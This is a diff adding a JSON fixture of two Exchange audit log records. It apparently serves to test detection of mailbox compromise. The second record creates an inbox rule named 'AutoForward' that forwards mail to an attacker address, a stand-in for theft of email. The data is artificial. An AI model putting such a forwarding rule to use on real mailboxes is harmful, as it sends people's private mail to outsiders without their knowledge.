@@ -1,0 +1,34 @@
+[
+  {
+    "Id": "exch-rec-001",
+    "RecordType": 2,
+    "CreationTime": "2026-03-05T14:45:00",
+    "Operation": "MailboxLogin",
+    "OrganizationId": "00000000-0000-0000-0000-000000000099",
+    "UserType": 0,
+    "UserKey": "user-key-001",
+    "Workload": "Exchange",
+    "ResultStatus": "Succeeded",
+    "UserId": "admin@acme-corp.dev",
+    "ClientIP": "203.0.113.10",
+    "MailboxOwnerUPN": "admin@acme-corp.dev",
+    "LogonType": 0
+  },
+  {
+    "Id": "exch-rec-002",
+    "RecordType": 2,
+    "CreationTime": "2026-03-05T15:15:00",
+    "Operation": "New-InboxRule",
+    "OrganizationId": "00000000-0000-0000-0000-000000000099",
+    "UserType": 0,
+    "UserKey": "user-key-001",
+    "Workload": "Exchange",
+    "ResultStatus": "True",
+    "UserId": "user@acme-corp.dev",
+    "MailboxOwnerUPN": "user@acme-corp.dev",
+    "Parameters": [
+      {"Name": "Name", "Value": "AutoForward"},
+      {"Name": "ForwardTo", "Value": "external@attacker.com"}
+    ]
+  }
+]
